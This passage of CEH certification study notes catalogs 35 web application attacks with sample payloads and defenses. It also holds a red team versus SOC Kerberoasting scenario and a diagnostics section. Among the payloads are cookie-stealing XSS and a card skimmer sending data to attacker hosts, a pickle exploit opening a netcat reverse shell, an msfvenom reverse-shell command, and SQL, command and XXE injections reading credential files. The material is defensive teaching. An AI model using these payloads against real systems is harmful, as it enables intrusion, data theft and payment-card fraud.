| **A08: Software & Data Integrity Failures**| **Brand New Category** | Unsigned firmware, CI/CD pipeline attacks, insecure deserialization. |
| **A09: Security Logging & Monitoring** | Moved from #10 | Breaches remain undetected due to missing telemetry and alert generation. |
| **A10: Server-Side Request Forgery (SSRF)**| **Brand New Category** | Cloud metadata harvesting (`169.254.169.254`) via server requests. |

---

## 12. The Complete Catalog of 35 Web Application Attacks

This catalog breaks down all **35 Web Application Attacks** documented in the [CEH Web Application Attacks Matrix](../References/CEH_REF/web_attacks.jpeg), providing the underlying concept, mechanics with sample payloads, and defensive mitigations for each:

```text
+----------------------------------------------------------------------------------------------------+
|                                    35 WEB APPLICATION ATTACKS TAXONOMY                             |
+----------------------------------------------------------------------------------------------------+
 [01] Directory Traversal         [10] Cross-Site Scripting (XSS)   [19] Cross-Site Request Forgery  [28] H2C Smuggling
 [02] Hidden Field Manipulation   [11] Buffer Overflow              [20] Cookie/Session Poisoning    [29] Clickjacking
 [03] Cookie Snooping             [12] Business Logic Bypass        [21] Insecure Deserialization    [30] JavaScript Hijacking
 [04] RC4 NOMORE Attack           [13] Web Timing Attacks           [22] Watering Hole Attack        [31] Cross-Site WebSocket
 [05] Pass-the-Cookie Attack      [14] CAPTCHA Attacks              [23] Denial-of-Service (DoS)     [32] Obfuscation Apps
 [06] Same-Site Attack            [15] Platform Exploits            [24] Web Service Attacks         [33] Network Access Attacks
 [07] SQL Injection (SQLi)        [16] XML External Entity (XXE)    [25] SSRF Payload Injection      [34] DMZ Protocol Attacks
 [08] Command Injection           [17] Unvalidated Redirects        [26] Cross-Site Port Attack (XSPA)[35] MarioNet Attack
 [09] LDAP Injection              [18] Magecart Attack              [27] DNS Rebinding Attack
+----------------------------------------------------------------------------------------------------+
```

---

### Attack 01: Directory Traversal
- **Concept:** Accessing files and directories stored outside the intended web root folder by abusing filesystem path validation.
- **Mechanics:** The application passes untrusted user input directly into filesystem API calls:
  ```http
  GET /view_receipt.php?file=../../../../../../etc/passwd HTTP/1.1
  Host: victim.com
  ```
- **Defense:** Avoid passing direct user input to filesystem APIs. Use basename validation, hardened chroot jails, and strict whitelisting.

---

### Attack 02: Hidden Field Manipulation
- **Concept:** Altering values inside hidden HTML form fields (`<input type="hidden">`) that developers mistakenly trust as immutable.
- **Mechanics:** An e-commerce site calculates checkout totals based on a hidden field:
  ```html
  <!-- Client alters value before submission -->
  <input type="hidden" name="item_price" value="0.01">
  ```
- **Defense:** Maintain all transactional state, pricing, and authorization logic exclusively on the server side.

---

### Attack 03: Cookie Snooping
- **Concept:** Eavesdropping on unencrypted session tokens transmitted over plaintext HTTP connections.
- **Mechanics:** An attacker on the same Wi-Fi or local network captures packets and extracts session tokens:
  ```http
  Cookie: session_id=3a9f029b4e18ac49...
  ```
- **Defense:** Enforce HTTPS via HTTP Strict Transport Security (HSTS) and apply the `Secure` flag to all session cookies.

---

### Attack 04: RC4 NOMORE Attack
- **Concept:** Exploiting cryptographic keystream biases in the legacy RC4 stream cipher to recover plaintext session tokens from TLS traffic.
- **Mechanics:** By sniffing millions of encrypted requests containing the same cookie at a fixed offset, statistical biases in RC4 reveal the underlying plaintext byte values.
- **Defense:** Completely disable the RC4 cipher suite across all web servers and load balancers. Enforce TLS 1.3 or modern TLS 1.2 AES-GCM suites.

---

### Attack 05: Pass-the-Cookie Attack
- **Concept:** Reusing a stolen, valid session cookie on an attacker-controlled machine to authenticate without entering credentials or passing MFA challenges.
- **Mechanics:** The attacker imports stolen cookies into their browser (`document.cookie="session_token=xyz"`) and requests `/dashboard`, inheriting the victim's session.
- **Defense:** Bind session tokens to client context fingerprints (Client IP subnets, TLS JA3/JA4 fingerprints) and implement short session idle timeouts.

---

### Attack 06: Same-Site Attack
- **Concept:** Bypassing `SameSite=Lax` cookie protections by routing malicious requests through compromised sibling subdomains or using top-level navigations.
- **Mechanics:** A cross-origin site executes a top-level `GET` navigation or exploits an XSS vulnerability on a shared parent domain (`blog.corp.com` attacking `bank.corp.com`), causing the browser to include the session cookie.
- **Defense:** Enforce `SameSite=Strict` on sensitive session cookies and isolate distinct functional units across separate apex domain names.

---

### Attack 07: SQL Injection (SQLi)
- **Concept:** Manipulating back-end SQL queries by injecting unescaped syntax characters into input fields.
- **Mechanics:**
  ```sql
  -- Target query: SELECT * FROM users WHERE user = '$user' AND pass = '$pass'
  -- Injected input: admin' OR '1'='1' --
  SELECT * FROM users WHERE user = 'admin' OR '1'='1' -- ' AND pass = ''
  ```
- **Defense:** Use **Parameterized Queries (Prepared Statements)** with Object-Relational Mappers (ORMs).

---

### Attack 08: Command Injection
- **Concept:** Executing arbitrary operating system commands on the hosting server through vulnerable application routines.
- **Mechanics:**
  ```http
  POST /api/ping HTTP/1.1
  Host: victim.com

  ip=127.0.0.1; cat /etc/shadow
  ```
- **Defense:** Avoid calling system shell interpreters (`system()`, `exec()`, `Runtime.getRuntime().exec()`). Use typed, sandboxed language APIs.

---

### Attack 09: LDAP Injection
- **Concept:** Exploiting input concatenation within LDAP directory search filters to bypass authentication or extract corporate directory objects.
- **Mechanics:**
  ```text
  Original Filter: (&(USER=input_user)(PASSWORD=input_pass))
  Injected User:   admin)(&)
  Resulting Filter: (&(USER=admin)(&)(PASSWORD=xyz))
  ```
- **Defense:** Use LDAP parameterized query interfaces and enforce strict structural escaping on all special characters (`*`, `(`, `)`, `\`, `NUL`).

---

### Attack 10: Cross-Site Scripting (XSS)
- **Concept:** Injecting client-side JavaScript that executes within the victim's browser session.
- **Mechanics:**
  - **Stored XSS:** Malicious payload saved to database and rendered to subsequent visitors:
    ```html
    <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
    ```
  - **Reflected XSS:** Payload echoed directly in immediate HTTP responses via URL parameters.
  - **DOM-based XSS:** Payload processed entirely client-side via insecure DOM sinks (`innerHTML`, `eval`).
- **Defense:** Context-aware output encoding, strict **Content Security Policy (CSP)**, and setting the `HttpOnly` cookie flag.

---

### Attack 11: Buffer Overflow in Web Applications
- **Concept:** Overwriting stack or heap memory structures in native C/C++ compiled web server modules or CGI extensions.
- **Mechanics:** Supplying an overlong string parameter to an HTTP header or parameter processed by native binaries:
  ```http
  GET /cgi-bin/process?data=AAAAAAAAAAAAAAAAAAAA... [overwrites return address]
  ```
- **Defense:** Compile binaries with memory mitigations (ASLR, DEP/NX, Stack Canaries) and migrate legacy CGI scripts to memory-safe languages.

---

### Attack 12: Business Logic Bypass Attack
- **Concept:** Exploiting intended application functionality in unintended sequences to subvert business rules without triggering software errors.
- **Mechanics:** Modifying quantities in an e-commerce checkout to negative values (`quantity=-2`), causing the checkout calculator to reduce the total balance or issue account credits.
- **Defense:** Implement end-to-end server-side boundary checks, state machine validation, and transactional invariants across all workflows.

---

### Attack 13: Web-Based Timing Attacks
- **Concept:** Inferring secret values by measuring subtle differences in application response times during cryptographic operations or authentication checks.
- **Mechanics:** If an authentication mechanism compares secret API keys character-by-character using non-constant time routines (`strcmp`), the response arrives microseconds slower when the first character matches:
  ```text
  Key guess "A...": Returns in 1.2ms
  Key guess "B...": Returns in 2.4ms (Match on 1st char!)
  ```
- **Defense:** Use **constant-time comparison routines** (`hash_equals()` in PHP, `crypto.timingSafeEqual()` in Node.js).

---

### Attack 14: CAPTCHA Attacks
- **Concept:** Automating challenges designed to differentiate humans from automated bots.
- **Mechanics:** Replaying previously validated CAPTCHA response tokens, submitting static audio transcription files to speech-to-text models, or exploiting server-side validation logic that accepts empty tokens.
- **Defense:** Enforce single-use token invalidation immediately upon evaluation and integrate modern behavioral challenges (e.g., Cloudflare Turnstile, reCAPTCHA v3).

---

### Attack 15: Platform Exploits
- **Concept:** Exploiting unpatched vulnerabilities within the underlying server stack (e.g., Apache, Nginx, PHP, Java, Node.js).
- **Mechanics:** Leveraging public exploits like **Log4Shell (CVE-2021-44228)** or Apache HTTP Server Path Traversal (CVE-2021-41773) to achieve Remote Code Execution.
- **Defense:** Implement continuous automated patch management, software bill of materials (SBOM) tracking, and minimal container images.

---

### Attack 16: XML External Entity (XXE) Attack
- **Concept:** Abusing XML parsers configured to resolve external entity definitions within incoming XML payloads.
- **Mechanics:**
  ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <user><name>&xxe;</name></user>
  ```
- **Defense:** Disable `DOCKTYPE` declarations, External DTDs, and External Entity Resolution (`EntityExpansionLimit = 0`) across all XML parsers.

---

### Attack 17: Unvalidated Redirects and Forwards
- **Concept:** Redirecting users to external destinations based on unvalidated URL parameters, facilitating credential phishing campaigns.
- **Mechanics:**
  ```http
  GET /login.php?redirect=https://evil-phishing-site.com HTTP/1.1
  Host: trusted-bank.com
  ```
- **Defense:** Avoid user-supplied redirection targets. Use static lookup keys or restrict destinations to an explicit internal domain whitelist.

---

### Attack 18: Magecart Attack
- **Concept:** Injecting malicious JavaScript skimmers into checkout and payment pages to capture credit card details in real time.
- **Mechanics:** Compromising a third-party supply-chain library or exploiting an S3 bucket to embed a credit card exfiltration script:
  ```javascript
  document.querySelector('#pay-btn').addEventListener('click', function() {
      fetch('https://c2.evil.com/log?card=' + document.querySelector('#cc').value);
  });
  ```
- **Defense:** Implement **Subresource Integrity (SRI)** (`integrity="sha384-..."`), monitor DOM modifications, and configure strict Content Security Policies.

---

### Attack 19: Cross-Site Request Forgery (CSRF)
- **Concept:** Tricking an authenticated user's browser into executing unwanted actions on a trusted web application.
- **Mechanics:** The victim visits a malicious site containing an auto-submitting form targeting their authenticated bank session:
  ```html
  <form action="https://trusted-bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to_account" value="99999">
    <input type="hidden" name="amount" value="5000">
  </form>
  <script>document.getElementById('csrf').submit();</script>
  ```
- **Defense:** Implement unique, cryptographically random **Anti-CSRF Tokens** validated on every state-changing POST/PUT request; configure `SameSite=Strict` cookies.

---

### Attack 20: Cookie/Session Poisoning
- **Concept:** Modifying the content of cookies or local storage to elevate privileges or bypass business logic.
- **Mechanics:** Tampering with insecurely serialized or base64-encoded cookie parameters:
  ```http
  Cookie: auth_data=eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ==
  # Decodes to: {"user":"bob","role":"user"}
  # Modified to: {"user":"bob","role":"admin"}
  Cookie: auth_data=eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0=
  ```
- **Defense:** Sign all client-side cookies cryptographically using HMAC secrets, or store session state exclusively in server-side session stores (e.g., Redis).

---

### Attack 21: Insecure Deserialization
- **Concept:** Converting untrusted serialized byte streams back into live application objects, triggering arbitrary code execution via gadget chains.
- **Mechanics:** An attacker crafts an object payload leveraging native framework libraries (e.g., Java `ysoserial`, Python `pickle` exploits):
  ```python
  import pickle, os
  class Exploit(object):
      def __reduce__(self):
          return (os.system, ('nc -e /bin/sh 10.10.14.5 4444',))
  payload = pickle.dumps(Exploit())
  ```
- **Defense:** Avoid deserializing untrusted user data. Use safe, standard data formats like JSON or Protocol Buffers.

---

### Attack 22: Watering Hole Attack
- **Concept:** Compromising a legitimate third-party website frequently visited by a specific target group to infect visitors with malware.
- **Mechanics:** An attacker identifies that industrial plant engineers visit `hvac-forum.com`, exploits that site, and implants an exploit kit serving browser zero-days.
- **Defense:** Endpoint Detection and Response (EDR) agents, isolated browsing environments (Remote Browser Isolation - RBI), and web proxy filtering.

---

### Attack 23: Denial-of-Service (DoS) in Web Applications
- **Concept:** Exhausting application resources through algorithmic complexity flaws or computationally expensive queries.
- **Mechanics:** Submitting crafted Regular Expressions designed to trigger exponential catastrophic backtracking (**ReDoS**):
  ```text
  Regex: ^([a-zA-Z0-9]+)*$
  Payload: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
  ```
- **Defense:** Enforce linear-time regex engines, set request execution timeouts, and limit query result set sizes.

---

### Attack 24: Web Service Attacks
- **Concept:** Attacking SOAP, WSDL, and REST APIs via schema poisoning, XML injection, and parameter tampering.
- **Mechanics:** Interrogating exposed WSDL definition endpoints (`/service?wsdl`) to discover undocumented internal methods, then submitting manipulated XML envelopes:
  ```xml
  <soapenv:Envelope><soapenv:Body><adminMethod><grantRole>Admin</grantRole></adminMethod></soapenv:Body></soapenv:Envelope>
  ```
- **Defense:** Disable public WSDL exposure, validate XML schemas against strict XSD definitions, and enforce API gateways with OAuth2 tokens.

---

### Attack 25: Injecting an SSRF Payload
- **Concept:** Forcing a vulnerable server-side application to generate requests to unexpected internal or cloud infrastructure endpoints.
- **Mechanics:** Abusing an image import parameter to query the AWS Cloud Instance Metadata Service:
  ```http
  POST /api/fetch_avatar HTTP/1.1
  Host: victim.com

  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
  ```
- **Defense:** Enforce strict URL whitelisting, block private RFC 1918 and loopback address ranges, and mandate **AWS IMDSv2** (requiring session tokens).

---

### Attack 26: Cross-Site Port Attack (XSPA)
- **Concept:** Abusing Server-Side Request Forgery (SSRF) vulnerabilities to port-scan internal networks and loopback interfaces behind firewalls.
- **Mechanics:** Submitting iterative port requests to internal endpoints and analyzing response timing and error messages:
  ```http
  GET /proxy?url=http://127.0.0.1:22   -> Returns "SSH-2.0-OpenSSH" (Open)
  GET /proxy?url=http://127.0.0.1:23   -> Returns "Connection Refused" (Closed)
  ```
- **Defense:** Restrict outbound application connections at the firewall/network layer and enforce egress network filtering.

---

### Attack 27: DNS Rebinding Attack
- **Concept:** Bypassing the browser's Same-Origin Policy (SOP) by dynamically altering DNS record resolution between public and local IP addresses.
- **Mechanics:**
  1. Victim visits attacker domain `rebind.evil.com` (DNS resolves to attacker IP `198.51.100.1` with TTL = 1s).
  2. The page loads and executes a JavaScript loop.
  3. The attacker's nameserver changes the DNS record for `rebind.evil.com` to `127.0.0.1`.
  4. The JavaScript makes an HTTP request to `rebind.evil.com/admin`; the browser re-resolves the domain to `127.0.0.1`, sending the request to the victim's internal network service.
- **Defense:** Validate the HTTP `Host` header on internal web services; reject requests whose Host does not match internal hostnames.

---

### Attack 28: H2C Smuggling Attack
- **Concept:** Smuggling HTTP/2 Cleartext (`h2c`) upgrade requests past reverse proxies that do not support or properly forward the upgrade protocol.
- **Mechanics:** A client sends an `Upgrade: h2c` header through a frontend proxy (like HAProxy or Nginx). The frontend passes the upgrade request to the backend, which establishes an uninspected HTTP/2 multiplexed tunnel, allowing the attacker to bypass access control lists configured on the proxy.
- **Defense:** Prohibit insecure protocol upgrade headers (`Upgrade: h2c`) at the reverse proxy level unless explicitly configured and supported end-to-end.

---

### Attack 29: Clickjacking Attack
- **Concept:** Overlaying a transparent `<iframe>` containing a vulnerable web application over an alluring decoy page to trick users into executing unintended actions.
- **Mechanics:** The attacker places an invisible target application button directly under a visible decoy button ("Claim Prize!"), hijacking the user's click:
  ```html
  <iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:100px; left:100px;"></iframe>
  <button style="position:absolute; top:100px; left:100px;">Click for Free Prize!</button>
  ```
- **Defense:** Enforce the `X-Frame-Options: DENY` header and configure the Content Security Policy directive `frame-ancestors 'none'`.

---

### Attack 30: JavaScript Hijacking
- **Concept:** Exploiting legacy browser implementations where JSON arrays were valid executable JavaScript statements to exfiltrate private user data.
- **Mechanics:** Overriding the global `Array` constructor in client-side script and embedding a sensitive authenticated JSON array endpoint using `<script src="https://bank.com/api/balance">`:
  ```javascript
  <script>
    Object.prototype.push = function(val) { alert('Stolen: ' + val); };
  </script>
  <script src="https://bank.com/api/user_data.json"></script>
  ```
- **Defense:** Return JSON data as an **Object** (`{"data": [...]}`) rather than a top-level array, and prefix responses with anti-execution loops (`for(;;);`).

---

### Attack 31: Cross-Site Web Socket Hijacking (CSWSH)
- **Concept:** Exploiting missing CSRF protections during the initial HTTP-to-WebSocket upgrade handshake.
- **Mechanics:** An attacker's site initiates a WebSocket connection to `wss://bank.com/stream`. The victim's browser includes their authentication cookies during the upgrade handshake:
  ```javascript
  var ws = new WebSocket('wss://bank.com/chat');
  ws.onopen = function() { ws.send('get_chat_history'); };
  ws.onmessage = function(e) { fetch('http://attacker.com/leak?d=' + e.data); };
  ```
- **Defense:** Validate the `Origin` header strictly during the WebSocket upgrade handshake and require unique, single-use CSRF tokens within the connection request.

---

### Attack 32: Obfuscation Application
- **Concept:** Transforming malicious payloads into semantically equivalent representations to bypass signature-based Web Application Firewalls (WAF).
- **Mechanics:** Utilizing tools like **JSFuck** (encoding code using only six characters: `[]()!+`), character code conversions, or nested encoding:
  ```javascript
  // Standard alert(1) encoded via JSFuck characters:
  [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]...]()
  ```
- **Defense:** Employ WAF engines featuring advanced normalization preprocessors and AST-based behavioral syntax analysis.

---

### Attack 33: Network Access Attacks
- **Concept:** Pivoting through a compromised internet-facing web server to access internal networks, management segments, and databases.
- **Mechanics:** After executing a web shell, an attacker uses tools like `chisel`, `sshuttle`, or `socat` to establish port forwards into internal VLANs:
  ```bash
  # Establish reverse SOCKS proxy through compromised web server
  chisel client 10.10.14.5:8000 R:socks
  ```
- **Defense:** Implement strict micro-segmentation, zero-trust network policies, and egress filtering on web application DMZs.

---

### Attack 34: DMZ Protocol Attacks
- **Concept:** Abusing legacy or poorly restricted protocols allowed through DMZ firewall pinholes to communicate with core internal networks.
- **Mechanics:** Using protocols like SNMP, Syslog (UDP 514), NTP, or NetBIOS allowed through DMZ firewalls to probe internal core servers.
- **Defense:** Enforce least-privilege firewall rules. Block all inter-zone communication except explicitly required ports and protocols.

---

### Attack 35: MarioNet Attack
- **Concept:** Retaining control of an infected browser even after the victim navigates away from the original malicious webpage by abusing modern HTML5 APIs.
- **Mechanics:** Exploits **Service Workers**, **Web Workers**, and modern web platform APIs to keep malicious background threads alive across subsequent navigations without user awareness:
  ```javascript
  // Registers persistent Service Worker to maintain C2 beaconing
  navigator.serviceWorker.register('/sw.js').then(function(reg) {
      console.log('MarioNet persistent background worker active.');
  });
  ```
- **Defense:** Configure strict Content Security Policies, limit worker registration permissions, and isolate sensitive web applications in private browsing contexts.

---

## 13. Big Picture: How It All Works Together

Security operations and penetration testing are two sides of the same coin: **Attackers seek a single unhardened link in the chain; defenders must secure every link across every layer.**

```text
+----------------------------------------------------------------------------------------------------+
|                                    THE COMPLETE ENTERPRISE DEFENSE MATRIX                          |
+----------------------------------------------------------------------------------------------------+

 OFFENSIVE KILL CHAIN (Red Team)                              DEFENSIVE COUNTERMEASURES (Blue Team / SOC)
 ────────────────────────────────                             ───────────────────────────────────────────
 1. Subdomain Recon & Amass Graph                             1. Asset Inventory & External Attack Surface Mgmt
 2. Nmap Service & Version Discovery                          2. Firewall Port Filtering & Host Discovery Blocks
 3. SMB / LDAP / SNMP Protocol Enumeration                    3. Disabling Null Sessions, Enforcing SNMPv3 & LDAP Sign
 4. Qualys Vulnerability Scanning                             4. Vulnerability Remediation & TruRisk Prioritization
 5. Hash Dumping & Offline Cracking (John/Hashcat)            5. Password Complexity, Salting, & MFA Enforcement
 6. Active Directory Kerberoasting & Golden Tickets           6. Managed Service Accounts, Regular KRBTGT Resets
 7. Malware Delivery & LOLBins Execution                      7. EDR Behavioral Blocking & YARA Detection Rules
 8. Network Sniffing & ARP Poisoning                          8. Dynamic ARP Inspection (DAI) & 802.1X Auth
 9. Session Hijacking (Caido/Burp)                            9. HttpOnly, Secure, SameSite Cookie Flags
 10. Perimeter Evasion (Palo Alto Bypass)                     10. Full TLS Decryption & App-ID Enforcement
 11. Exploiting OWASP Top 10 Web Vulnerabilities              11. WAF Rule Normalization & Parameterized Queries
```

---

## 14. Real-Time Technical Scenario: Red Team Assessment vs. SOC Response

### Phase 1: Offensive Execution (Red Team Operator)
- **Objective:** Compromise `corp.local` domain and extract customer records from an internal database.
- **Step 1:** The tester discovers an open SMB share (`backups`) via anonymous null session probing:
  ```bash
  smbclient //10.10.10.50/backups -N
  ```
- **Step 2:** The share contains a backup archive with an NTLM hash for service account `sql_svc`.
- **Step 3:** The hash is cracked using John the Ripper (`john --format=NT --wordlist=rockyou.txt hash.txt`), revealing `Summer2026!`.
- **Step 4:** Using these credentials, the tester executes a Kerberoasting attack (`impacket-GetUserSPNs`), requesting a Service Ticket for the SPN `MSSQLSvc/db01.corp.local`.
- **Step 5:** The Kerberoasted hash is cracked to recover the database administrator's password, granting direct access to sensitive records.

### Phase 2: Defensive Detection & Response (SOC Analyst)
- **Telemetry 1:** The Palo Alto NGFW flags an unauthenticated connection to SMB port 445 from an unauthorized internal subnet.
- **Telemetry 2:** The Windows Domain Controller generates **Event ID 4769** (*A Kerberos service ticket was requested*) with anomalous RC4 ticket encryption (`0x17`), indicating Kerberoasting activity.
- **Telemetry 3:** The SIEM correlates the events and triggers an alert:
  ```spl
  index=wineventlog EventCode=4769 TicketEncryptionType=0x17 ServiceName="MSSQLSvc*" 
  | stats count by TargetUserName, ClientAddress 
  | where count > 1
  ```
- **Containment Action:** The SOC automatically disables the compromised `sql_svc` account via SOAR playbooks, terminates active sessions, and resets the ticket encryption to AES-256.

---

## 15. Failed Attempts & Engineering Diagnostics

Understanding why attacks fail is essential for both penetration testing and defense:

```text
+-----------------------------------------------------------------------------------+
|                        ENGINEERING DIAGNOSTIC: FAILED ATTEMPTS                    |
+-----------------------------------------------------------------------------------+

 1. FAILED: Anonymous SMB Session Enumeration
    • Error: "NT_STATUS_ACCESS_DENIED"
    • Root Cause: Target OS has 'RestrictNullSessAccess' enabled in registry.
    • Fix/Alternative: Supply valid low-privileged domain credentials or look for
      other exposed services (e.g., anonymous LDAP binds).

 2. FAILED: SNMP Walk Returns Zero Results
    • Error: "Timeout: No Response from 10.10.10.50"
    • Root Cause: SNMP service upgraded to SNMPv3 or community string is not 'public'.
    • Fix/Alternative: Use community string dictionaries with onesixtyone.

 3. FAILED: Buffer Overflow Shellcode Crashes Process
    • Error: "Access Violation reading 0x00000000"
    • Root Cause: Shellcode contains unhandled bad characters (e.g., \x00, \x0a)
      that truncated the payload in memory.
    • Fix/Alternative: Regenerate shellcode with msfvenom excluding bad characters:
      msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -b "\x00\x0a\x0d" -f c

 4. FAILED: Kerberoasting Yields Uncrackable Hashes
    • Error: Hashcat runs for days with zero matches.
    • Root Cause: Target service account uses AES-256 Kerberos keys with a 30+
      character random password.
    • Fix/Alternative: Pivot to other attack vectors (e.g., AS-REP Roasting, ACL abuse).
+-----------------------------------------------------------------------------------+
```

---

## 16. My Understanding Check

Test your comprehension of the concepts covered in this master lecture. Answers are omitted so you can test your knowledge.

1. **Scenario 1:** A penetration tester compromises the NTLM hash of an Active Directory service account. Can they forge a Golden Ticket, a Silver Ticket, or both? Explain the difference in what secrets are required and how each communicates with the Domain Controller.
2. **Scenario 2:** An e-commerce web application uses `SameSite=Lax` for all session cookies. Explain how an attacker can still execute an attack against this session, and identify which of the 35 web attacks are relevant.
3. **Scenario 3:** A SOC analyst reviews firewall logs and notices a spike in HTTP traffic where connections remain open for several minutes with headers arriving in 10-second increments. What specific attack is occurring, at which OSI layer does it operate, and why does standard volumetric DDoS filtering fail to stop it?
4. **Scenario 4:** Explain why the presence of `no_root_squash` in an NFS `/etc/exports` configuration represents a critical vulnerability, and walk through the exact steps an attacker takes to exploit it.
5. **Scenario 5:** In Palo Alto Networks NGFW architecture, how does the `App-ID` engine handle an attacker running an SSH tunnel over port 80? Will the firewall classify this traffic as web-browsing or SSH, and why?

---

> **Navigation:** [🏠 CEH Dashboard](./README.md) | [⬅️ Module 03: Scanning Networks](./mod-03-scanning-networks.md) | [➡️ Modules 15–20 Master Class](./2026-10-31-ceh-advanced-domains-notes.md) | [Main Dashboard](../README.md)  
*CEH v13 Master Class Notes — Maintained as a comprehensive learning portfolio.*
